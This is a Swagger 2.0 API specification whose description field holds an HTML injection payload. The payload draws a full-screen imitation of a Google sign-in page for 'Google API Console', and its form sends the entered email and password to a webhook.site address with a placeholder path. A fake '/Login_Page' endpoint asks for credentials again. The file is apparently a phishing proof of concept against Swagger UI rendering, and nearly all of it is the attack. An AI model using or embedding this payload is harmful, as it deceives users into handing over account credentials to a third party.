swagger: '2.0'
info:
  version: 1.0.0
  title: Swagger UI
  description: '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#f0f4f9;z-index:99998;font-family:Segoe UI,Arial,sans-serif;overflow:auto;"><div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:420px;max-width:94%;background:#fff;border-radius:8px;box-shadow:0 6px 32px rgba(0,0,0,.3);overflow:hidden;z-index:99999;"><div style="padding:40px 40px 30px;"><div style="font-size:22px;font-weight:500;color:#1f1f1f;font-family:Arial;">Sign in</div><div style="font-size:16px;color:#1f1f1f;margin:8px 0 4px;">Use your Google Account</div><div style="font-size:14px;color:#444746;margin-bottom:24px;">to continue to <strong>Google API Console</strong></div><form action="https://webhook.site/REPLACE-ME" method="post"><input type="text" name="email" placeholder="Email or phone" style="width:100%;padding:14px;border:1px solid #747775;border-radius:4px;font-size:16px;box-sizing:border-box;margin-bottom:10px;"><input type="password" name="password" placeholder="Password" style="width:100%;padding:14px;border:1px solid #747775;border-radius:4px;font-size:16px;box-sizing:border-box;"><div style="font-size:14px;color:#0b57d0;margin:14px 0 24px;">Forgot password?</div><div style="display:flex;justify-content:space-between;align-items:center;"><span style="font-size:14px;color:#0b57d0;">Create account</span><button type="submit" style="padding:11px 28px;background:#0b57d0;color:#fff;border:none;border-radius:24px;font-size:15px;font-weight:600;cursor:pointer;">Next</button></div></form></div><div style="padding:0 40px 30px;font-size:12px;color:#444746;">English (United States) &nbsp; Help &nbsp; Privacy &nbsp; Terms</div></div></div>'
paths:
  /Login_Page:
    post:
      summary: Login here to continue
      description: Please provide your credentials to continue.
      parameters:
        - name: username
          in: formData
          description: The username for login
          required: true
          type: string
        - name: password
          in: formData
          description: The password for login
          required: true
          type: string
      tags:
        - Click here to login
      responses:
        '200':
          description: OK
        '400':
          description: Bad request
        '500':
          description: Server error
